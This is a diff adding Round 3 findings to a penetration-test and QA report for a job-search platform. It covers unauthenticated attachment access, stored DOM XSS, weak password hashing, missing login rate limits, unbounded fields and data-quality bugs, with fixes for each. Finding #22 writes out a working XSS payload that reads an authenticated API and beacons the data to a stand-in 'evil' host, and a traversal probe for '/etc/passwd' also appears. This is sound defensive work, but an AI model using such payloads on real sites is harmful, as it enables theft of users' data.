@@ -78,6 +78,17 @@ one place.
 | 18 | 🟡 | Search / Data | `Stripe` company shows `job_count: 61` but `/jobs?search=Stripe` returns only 3 (title matches). Finding #4 fix is in `212830a` but may not be deployed, or `Job.company.has()` isn't surfacing all rows | ⬜ open |
 | 19 | 🔵 | Security headers | Response headers missing `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, Cross-Origin policies. Cookie flags are good (`HttpOnly; Secure; SameSite=lax`) | ⬜ open |
 | 20 | 🔵 | Role Clusters | `POST /api/v1/role-clusters` accepts arbitrary punctuation/special-chars in `name` (stored lowercased); no `[a-z0-9_-]+` sanitization. Safe vs. SQLi (ORM), but `name` is used as URL param downstream | ⬜ open |
+| 21 | 🔴 | Security / Feedback | `GET /api/v1/feedback/attachments/{filename}` has **NO auth dependency** (`feedback.py:193-201`). Any anonymous request, or any user regardless of role, can download any attachment given its UUID filename. Verified on prod: admin upload + viewer user download returned identical 70-byte file | ⬜ open |
+| 22 | 🔴 | Security / XSS | `JobDetailPage.tsx:390` renders `description.raw_text` via `dangerouslySetInnerHTML` whenever it contains `<`. `raw_text` comes straight from third-party ATS JSON (Greenhouse/Lever/Ashby/etc.), and `jobs.py:276-278` even HTML-unescapes it. A job-poster on any platform can inject `<script>` → stored DOM XSS on our origin (cookies are `HttpOnly` but authenticated APIs still callable) | ⬜ open |
+| 23 | 🔴 | Security / Auth | `auth.py:36-43` hashes passwords as single-round `hashlib.sha256(jwt_secret + ':' + password)`. Salt is **global** (not per-user), no key stretching, no constant-time compare. Code comment itself says "For production use bcrypt instead". A DB leak trivially yields all passwords via GPU brute-force | ⬜ open |
+| 24 | 🟠 | Security / Auth | No rate limiting, lockout, or CAPTCHA on `POST /api/v1/auth/login`. 25 wrong-password attempts all accepted; under burst a few return 503 (backend thread exhaustion, not a limiter). Enables online credential stuffing | ⬜ open |
+| 25 | 🟡 | Validation | `FeedbackCreate` schema (`schemas/feedback.py`) bounds `title` to 200 chars but `description`, `steps_to_reproduce`, `expected_behavior`, `actual_behavior`, `use_case`, `proposed_solution`, `impact`, `screenshot_url` have **no max_length**. Prod accepted a 1 MB description (verified); an attacker can bloat the DB. `screenshot_url` also has no URL validator (`javascript:` accepted) | ⬜ open |
+| 26 | 🟡 | Intelligence | `/intelligence/timing` → `posting_by_day`: Sunday 50.3% (23,696/47,142), Mon-Sat 13.8%→4.1%. Smells like a date-parsing fallback landing on day-0, or a bulk-seed weekend import. User-facing recommendation "post on Sundays" would be wrong if data is skewed | ⬜ open |
+| 27 | 🟡 | Intelligence | `/intelligence/networking` suggestions return corrupted name/title/email concatenations. Example: `{name: "Gartner PeerInsights", title: "Wade BillingsVP, Technology Services, Instructure", company: "BugCrowd", email: "gartner.peerinsights@bugcrowd.com"}` — clearly scraped-from-page strings glued together, with first-word-of-name used to synthesize a company-domain email. Misleading for users doing outreach | ⬜ open |
+| 28 | 🟡 | Copy / Data | Finding #12 partial: AI Insight now says "Platform has 47,081 jobs indexed across **10** ATS sources" but `/api/v1/platforms` returns **14** distinct platforms (including `bamboohr`, `recruitee`, `wellfound`, `weworkremotely` with 0 jobs). Root cause: `total_sources` uses `COUNT(DISTINCT jobs.platform)` which excludes platforms with no current job rows | ⬜ open |
+| 29 | 🔵 | Feedback UI | Stats cards at top of `/feedback` show "Total 33 · Open 16 · In Progress 0 · Resolved 12" (sum = 28). The 5 `closed` tickets exist (`GET /feedback/stats` → `by_status.closed: 5`) but there's no card for them. Users see "Total 33" then 28 in cards and can't reconcile | ⬜ open |
+| 30 | 🔵 | Feedback UI | In the ticket detail modal, "Update Ticket" is rendered without visible button styling — appears as plain black text next to the status dropdown. Users can't tell it's clickable. Also, no success toast after save (modal auto-closes silently). Functionality works (PATCH 200, persists, stats update), only discoverability is poor | ⬜ open |
+| 31 | 🟡 | Feedback | Legacy duplicate tickets from before Finding #11 fix are still present: 8 identical "Resume Score / Relevance" tickets from khushi.jain@ still show as open. Dedup prevents new dupes but doesn't merge/close old ones — queue cleanup task | ⬜ open |
 
 ---
 
@@ -503,6 +514,308 @@ Test cluster was deleted via `DELETE /api/v1/role-clusters/<id>` → 200 OK.
 - **Pagination bounds:** `page=0` → 422, `page=999999999` → 200 with empty items + correct `total_pages`, `page_size=-1` → 422, `page_size=9999` → 422 (clamped at 200). Sensible.
 - **Silent sort fallback:** `sort_by=malicious_column` → 200 with default sort (first_seen_at). Safe but no error signal — consider 422 for unknown sort columns.
 - **Finding #10 retest:** the "1name" card still exists at id `73617d28-a631-46d5-bc45-934c9b135cfc` with `total_open_roles: 123, accepted_jobs_count: 1, stage: researching`. Awaiting the data-cleanup task the fixer flagged.
+
+---
+
+## 13. Round 3 Findings (2026-04-15, post-deploy retest + new probes)
+
+Context: after the fixer announced "Changes deployed on prod" (commit `212830a`
+plus `6205733`), the tester re-verified Round-1 fixes and continued with deeper
+probes. All Round-1 fixes pass re-test. All side-effects from new probes were
+reverted (probe feedback tickets resolved with `[regression test cleanup]` note,
+attachments deleted, status PATCHes restored to original).
+
+### Round-1 fix retest (all ✅ on prod)
+
+| # | Probe | Prod result | Verdict |
+|---|---|---|---|
+| 2 | `GET /analytics/overview` vs `GET /companies?per_page=1` | both return `6638` | ✅ fixed |
+| 4 | `GET /jobs?search=Bitwarden` → 17 items · `search=Stripe` → 61 items (matches `companies.job_count`) | fixed | ✅ fixed (supersedes Finding #18) |
+| 6 | `GET /analytics/trends?days=7` returns both `day/total` AND aliased `date/new_jobs/count` keys | no NaN | ✅ fixed |
+| 11 | Duplicate POST with same title within 7d → `409` + `existing_feedback_id` | correct | ✅ fixed |
+| 12 | AI-insight now says "10 ATS sources" (was "6") | improved — **but still mismatches `/platforms` which shows 14**; tracked as new Finding #28 | 🟡 partial |
+
+---
+
+### 21. Unauthenticated file access via feedback attachment endpoint
+**Severity:** 🔴 BLOCKER · **Area:** `backend/app/api/v1/feedback.py:193-201`
+
+```python
+@router.get("/attachments/{filename}")
+async def get_attachment(filename: str):      # ← NO Depends(get_current_user)
+    safe_name = Path(filename).name
+    file_path = UPLOAD_DIR / safe_name
+    if not file_path.exists():
+        raise HTTPException(404, "File not found")
+    return FileResponse(file_path)
+```
+
+Reproduced on prod:
+1. Admin creates a feedback ticket + uploads `probe.png` → stored filename `3ae9b021c4c841738b74deecff3d6f2f.png`.
+2. `curl …/api/v1/feedback/attachments/3ae9b021c4c841738b74deecff3d6f2f.png` **without any cookie** → `HTTP 200, 70 bytes` (file served).
+3. Viewer user (`test-viewer@`) downloads same file → `HTTP 200, 70 bytes` (byte-identical).
+4. `diff` against the admin download: **IDENTICAL**.
+
+Directory traversal is correctly blocked (`Path(filename).name` strips dirs — `../../etc/passwd` → 404).
+
+**Impact:** users attach screenshots / PDFs of internal screens, resumes, or bug context to tickets thinking it's private. The 32-char hex filenames are hard to guess, but are logged in nginx access logs, leak via Referer headers if anyone clicks a link out, appear in the feedback JSON (exposed to anyone who can list any feedback), etc. A `viewer` role is explicitly allowed to see another user's attachment today.
+
+**Fix:** add `user: User = Depends(get_current_user)` to the signature. Then check that the feedback row referencing this filename belongs to `user.id` (or user is admin/super_admin). Simplest:
+```python
+async def get_attachment(filename: str, user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
+    # Find the feedback that owns this attachment
+    result = await db.execute(select(Feedback).where(Feedback.attachments.like(f'%"filename": "{filename}"%')))
+    fb = result.scalar_one_or_none()
+    if not fb or (fb.user_id != user.id and user.role not in ("admin","super_admin")):
+        raise HTTPException(404, "File not found")
+    # …serve file…
+```
+
+Probe attachment + feedback ticket were deleted after testing.
+
+---
+
+### 22. Stored DOM-XSS via third-party ATS HTML in JobDetailPage
+**Severity:** 🔴 BLOCKER · **Area:** `frontend/src/pages/JobDetailPage.tsx:386-396` + `backend/app/api/v1/jobs.py:276-278`
+
+```tsx
+{description.raw_text.includes("<") ? (
+  <div
+    className="prose prose-sm max-w-none text-gray-700"
+    dangerouslySetInnerHTML={{ __html: description.raw_text }}   // ← stored ATS HTML
+  />
+) : (
+  <div className="prose prose-sm max-w-none text-gray-700 whitespace-pre-wrap">
+    {description.raw_text}
+  </div>
+)}
+```
+
+`raw_text` comes directly from the ATS response (`raw_json.content` from Greenhouse, `descriptionHtml` from Ashby, etc.). The backend further **HTML-unescapes** it at `jobs.py:276-278`, so any platform that escaped `<` as `&lt;` in its API response has that protection actively *removed* by our code before we inject it into the DOM.
+
+Why this matters:
+- An attacker posting a job on any supported ATS can include `<img src=x onerror=fetch('/api/v1/users',{credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('//evil/',JSON.stringify(d)))>`.
+- Any authenticated user who opens that job detail page runs the attacker's JS on our origin.
+- `HttpOnly` cookie blocks `document.cookie` access, but `fetch` with `credentials:'include'` works fine — the attacker can call any authenticated endpoint (list all contacts, patch pipeline, create admin feedback, etc.).
+- We confirmed existing prod job descriptions are full of legitimate HTML (`<p>`, `<ul>`, etc.) — so we can't just strip all tags, but we MUST sanitize.
+
+Verified injection path is live: the real first job's `raw_text.len = 14988` and contains `<`, i.e. hits the dangerous branch.
+
+**Fix:** add `dompurify` (~20 KB) and sanitize before setting innerHTML:
+```tsx
+import DOMPurify from 'dompurify';
+…
+dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(description.raw_text, {
+  ALLOWED_TAGS: ['p','br','ul','ol','li','strong','em','b','i','u','h1','h2','h3','h4','h5','h6','a','code','pre','blockquote'],
+  ALLOWED_ATTR: ['href','title'],
+  ALLOWED_URI_REGEXP: /^(https?|mailto):/i,
+}) }}
+```
+Also remove the backend `html_mod.unescape` at `jobs.py:276-278` — it's actively making things worse.
+
+---
+
+### 23. Password hashing uses unstretched SHA-256 with a global salt
+**Severity:** 🔴 BLOCKER · **Area:** `backend/app/api/v1/auth.py:36-43`
+
+```python
+def _hash_password(password: str) -> str:
+    """SHA-256 hash with salt from jwt_secret. For production use bcrypt instead."""
+    salted = f"{settings.jwt_secret}:{password}"
+    return hashlib.sha256(salted.encode()).hexdigest()
+
+def _verify_password(password: str, password_hash: str) -> bool:
+    return _hash_password(password) == password_hash
+```
+
+Problems (three):
+1. **Single-round SHA-256.** Designed to be fast. A 4090 does ~10 Gh/s — 10-char passwords fall in hours.
+2. **Global salt** (`jwt_secret`), not per-user. Two users with the same password have identical hashes. Rainbow tables become viable once the secret leaks.
+3. **Non-constant-time compare** (`==`). Even at SHA-256 speeds, the timing side-channel is small-but-real — should use `hmac.compare_digest`.
+
+The code itself admits the issue: `"""For production use bcrypt instead."""` — but prod is using this.
+
+**Fix:** migrate to `bcrypt` / `argon2-cffi` with lazy upgrade:
+```python
+from passlib.hash import bcrypt
+def _hash_password(p): return bcrypt.using(rounds=12).hash(p)
+def _verify_password(p, h):
+    # First try bcrypt; fall back to the legacy SHA-256 and upgrade on next login
+    if h.startswith("$2"): return bcrypt.verify(p, h)
+    legacy = hashlib.sha256(f"{settings.jwt_secret}:{p}".encode()).hexdigest()
+    return hmac.compare_digest(legacy, h)
+```
+On successful legacy verify, re-hash with bcrypt and update `user.password_hash` in the same transaction. After a migration window, drop the fallback.
+
+---
+
+### 24. No rate limiting / lockout on login endpoint
+**Severity:** 🟠 HIGH · **Area:** `backend/app/api/v1/auth.py:60-90`
+
+Probes:
+- 25 consecutive wrong-password POSTs in 15s: all accepted (mix of 401s and transient 503s). No 429, no Retry-After, no account-lock flag on the user row.
+- Immediately after: valid creds log in fine. No IP-ban, no email alert.
+- Under burst, the backend starts returning 503 (queue exhaustion, likely because each login does a DB roundtrip + a password hash on the request thread) — but this is a side effect, not a defence.
+
+Combined with Finding #23 (fast hashing), this makes **online** credential stuffing viable. Even with bcrypt, we'd still want a limiter.
+
+**Fix:** add `slowapi` (FastAPI-friendly wrapper over limits). Typical rule: 10 login attempts per IP per 15 min, 5 failed attempts per email per hour. Either return 429 immediately or inject a 1-5s delay. Also add an `auth_failures` counter on `User` and lock at 10 consecutive fails (unlock after 1h or via admin).
+
+---
+
+### 25. Feedback schema has no max_length on free-text fields
+**Severity:** 🟡 MEDIUM · **Area:** `backend/app/schemas/feedback.py`
+
+```python
+class FeedbackCreate(BaseModel):
+    title: str = Field(..., min_length=5, max_length=200)    # ✅ bounded
+    description: str = Field(..., min_length=20)              # ❌ no max
+    steps_to_reproduce: str | None = None                     # ❌
+    expected_behavior: str | None = None                      # ❌
+    actual_behavior: str | None = None                        # ❌
+    use_case: str | None = None                               # ❌
+    proposed_solution: str | None = None                      # ❌
+    impact: str | None = None                                 # ❌
+    screenshot_url: str | None = None                         # ❌ also no URL check
+```
+
+Verified: `POST /feedback` with `description = 'A' * 1_000_000` → **HTTP 200**, stored. The 1MB ticket was cleaned up.
+
+**Impact:** DB bloat, network bandwidth, UI render jank (a 1MB description in the card preview). `screenshot_url` accepting `javascript:` is a footgun if the field is ever rendered via `<a href>` or inline image.
+
+**Fix:** `description: str = Field(..., min_length=20, max_length=10_000)` (and similar on siblings). For `screenshot_url`, use `pydantic.HttpUrl` or `Field(pattern=r'^https?://…')`.
+
+---
+
+### 26. Intelligence → Timing posting_by_day is massively skewed to Sunday
+**Severity:** 🟡 MEDIUM · **Area:** `backend/app/api/v1/intelligence.py` (timing endpoint) + upstream `Job.posted_at`/`first_seen_at`
+
+`GET /api/v1/intelligence/timing` → `posting_by_day`:
+```
+Sunday    23696  50.3%   ← anomalous
+Monday     6496  13.8%
+Tuesday    5456  11.6%
+Wednesday  4169   8.8%
+Thursday   3020   6.4%
+Friday     2384   5.1%
+Saturday   1921   4.1%
+```
+Half of all jobs are posted on Sunday? Far more likely that jobs with missing `posted_at` fall back to `first_seen_at`, and the first bulk import / weekly backfill happened on a Sunday, skewing the "day of week" aggregation.
+
+**Fix:** investigate the aggregation SQL. If it's using `EXTRACT(DOW FROM COALESCE(posted_at, first_seen_at))`, switch to `EXTRACT(DOW FROM posted_at)` and filter out `NULL posted_at` explicitly. If the data genuinely has no real `posted_at` for those 23k rows, the "post on Sundays" recommendation this page emits is garbage — hide the card or add a "low data quality" disclaimer.
+
+---
+
+### 27. Intelligence → Networking returns corrupted contact fields
+**Severity:** 🟡 MEDIUM · **Area:** `GET /api/v1/intelligence/networking` + upstream contact ingestion
+
+First suggestion returned on prod:
+```json
+{
+  "name": "Gartner PeerInsights",
+  "title": "Wade BillingsVP, Technology Services, Instructure",
+  "company": "BugCrowd",
+  "email": "gartner.peerinsights@bugcrowd.com",
+  "is_decision_maker": true,
+  "open_roles": 31,
+  "top_relevance_score": 98.0
+}
+```
+
+Multiple signals of broken ingestion:
+- `name` is a product name ("Gartner PeerInsights"), not a person.
+- `title` has two glued values: `"Wade Billings" + "VP, Technology Services, Instructure"` with no space.
+- `company` says `"BugCrowd"` but title mentions `"Instructure"` — contact is probably from Instructure listed against the wrong company.
+- `email` was synthesized as `{slugified name}@{company domain}` → `gartner.peerinsights@bugcrowd.com` — plausibly a catch-all but definitely not a real person's inbox.
+
+**Impact:** sales team gets presented with decision-maker outreach suggestions with wrong names, wrong companies, wrong emails. Worst-case we email the wrong person at the wrong company with a personalized note referencing another company. Reputational + deliverability damage.
+
+**Fix:** audit the contact ingestion pipeline — where is `name` vs `title` being split? `email_status: "catch_all"` suggests the synthesizer is aware the email is unverified but still surfacing it as a high-relevance suggestion (98.0). At minimum, filter `email_status == "catch_all"` out of the default suggestions list, and add a sanity check that `name` is two tokens (first/last) without commas/colons.
+
+---
+
+### 28. AI Insight "10 ATS sources" mismatches Platforms page "14"
+**Severity:** 🟡 MEDIUM · **Area:** `backend/app/api/v1/analytics.py:130` (`total_sources` computation) vs `/api/v1/platforms`
+
+- `GET /analytics/ai-insights` → insight text: *"Platform has 47,081 jobs indexed across **10** ATS sources."*
+- `GET /api/v1/platforms` → 14 distinct platforms: `ashby, bamboohr, greenhouse, himalayas, jobvite, lever, linkedin, recruitee, remoteok, remotive, smartrecruiters, wellfound, weworkremotely, workable`.
+
+Gap of 4: `bamboohr, recruitee, wellfound, weworkremotely` all have boards in the DB but 0 current `jobs` rows (Finding #7 lists three of these as stuck at 0). `COUNT(DISTINCT jobs.platform)` therefore returns 10.
+
+The Finding #12 fix moved the number from `6 → 10` (good), but the user-facing comparison is still off by 4 because two different queries back the two numbers. A platform row with an active board but temporarily 0 jobs is still "a source" from the user's perspective.
+
+**Fix:** change `total_sources` to `COUNT(DISTINCT company_ats_boards.platform WHERE is_active = true)` — i.e. source "what we monitor" rather than "what produced a job row today". This also matches the Platforms page, which the user sees right next to the insight card.
+
+---
+
+### 29. Feedback stats cards omit "Closed" → Total does not reconcile
+**Severity:** 🔵 LOW · **Area:** `frontend/src/pages/FeedbackPage.tsx` stats row
+
+At `/feedback` the summary cards show:
+```
+Total 33   ·   Open 16   ·   In Progress 0   ·   Resolved 12
+```
+But `GET /feedback/stats.by_status` returns `{open: 16, in_progress: 0, resolved: 12, closed: 5}`. 16+0+12 = 28 ≠ 33. The 5 `closed` tickets exist and are selectable via the status dropdown, but there's no stat card for them — users can't reconcile the Total without opening the filter.
+
+**Fix:** add a fourth card `Closed X` (or combine Resolved+Closed into a single `Done X` card). Cheap win.
+
+---
+
+### 30. "Update Ticket" has no button styling + no success toast
+**Severity:** 🔵 LOW · **Area:** ticket-detail modal in `frontend/src/pages/FeedbackPage.tsx`
+
+- "Update Ticket" is rendered as plain black text next to the Status dropdown — no border, no background, no hover state visible. Accessibility tree confirms it is a `<button>`, but visually it reads as a label.
+- On click, PATCH goes through and the modal closes, but there is no toast/snack confirming success. New users may click twice, or assume nothing happened.
+
+Functionality is correct (`PATCH /feedback/{id}` → 200, status and notes persist, stats cards update in real time — verified end-to-end on prod with the "Search Bar" ticket, then reverted).
+
+**Fix:** style the button (use the existing `Button variant="primary"` component). Wire up the existing toast system (`sonner` / `react-hot-toast` — whichever ships with the app) on `mutation.onSuccess`.
+
+---
+
+### 31. Legacy duplicate "Resume Score / Relevance" tickets still present
+**Severity:** 🟡 MEDIUM · **Area:** data cleanup (not code)
+
+Finding #11 prevents **new** duplicates — but the original 8 identical `Resume Score / Relevance` tickets from `khushi.jain@reventlabs.com` (submitted 4/14, all status=open) are still in the queue. Current open list has the dupes pre-dating the fix and clutters the admin view.
+
+Listed open tickets (2026-04-15, admin filter status=open, total 16):
+```
+[MEDIUM] 4edaefed · improvement     · Search Bar                          · khushi.jain@
+[MEDIUM] e93fabd0 · improvement     · Problem of Filter Stickness         · khushi.jain@
+[   LOW] 750b7716 · bug             · Testing                             · aditya.bambal@
+[MEDIUM] e0115437 · bug             · Testing                             · aditya.bambal@
+[MEDIUM] e46d2820 · bug             · Testing                             · aditya.bambal@
+[MEDIUM] 58e6e669 · improvement     · Problem of Filter Stickness         · khushi.jain@   ← dupe of e93fabd0
+[MEDIUM] c9f184ad · improvement     · Resume Score / Relevance            · khushi.jain@   ↓ 8 dupes
+[MEDIUM] 4ef54eee · improvement     · Resume Score / Relevance            · khushi.jain@
+[MEDIUM] a0c81e13 · improvement     · Resume Score / Relevance            · khushi.jain@
+[MEDIUM] f660c03c · improvement     · Resume Score / Relevance            · khushi.jain@
+[MEDIUM] 4449f64a · improvement     · Resume Score / Relevance            · khushi.jain@
+[MEDIUM] 936f130c · improvement     · Resume Score / Relevance            · khushi.jain@
+[MEDIUM] 2085b342 · improvement     · Resume Score / Relevance            · khushi.jain@
+[MEDIUM] ab888c64 · improvement     · Resume Score / Relevance            · khushi.jain@
+[   LOW] 878fd009 · bug             · API test screenshot URL check       · admin@jobplatform.io
+[MEDIUM] ce73c529 · improvement     · Search Bar Query                    · khushi.jain@
+```
+
+Recommended cleanup (one-off SQL, with admin approval):
+```sql
+-- Keep the first (oldest) Resume Score ticket from khushi.jain, close the rest
+UPDATE feedback SET status='closed', admin_notes=COALESCE(admin_notes,'') || ' [auto-closed as dup of earliest]'
+ WHERE user_id = (SELECT id FROM users WHERE email='khushi.jain@reventlabs.com')
+   AND title = 'Resume Score / Relevance' AND status = 'open'
+   AND id NOT IN (
+     SELECT id FROM feedback WHERE user_id=(SELECT id FROM users WHERE email='khushi.jain@reventlabs.com')
+      AND title='Resume Score / Relevance' AND status='open' ORDER BY created_at LIMIT 1
+   );
+-- Same for Problem of Filter Stickness (2 copies)
+UPDATE feedback SET status='closed' WHERE id='58e6e669-…';
+-- Delete obvious "Testing" tickets from aditya.bambal@
+DELETE FROM feedback WHERE user_id=(SELECT id FROM users WHERE email='aditya.bambal@reventlabs.com')
+  AND title='Testing' AND status='open';
+```
+
+Verify counts after: `/feedback/stats.by_status.open` should drop from 16 → about 6.
 
 ---
 
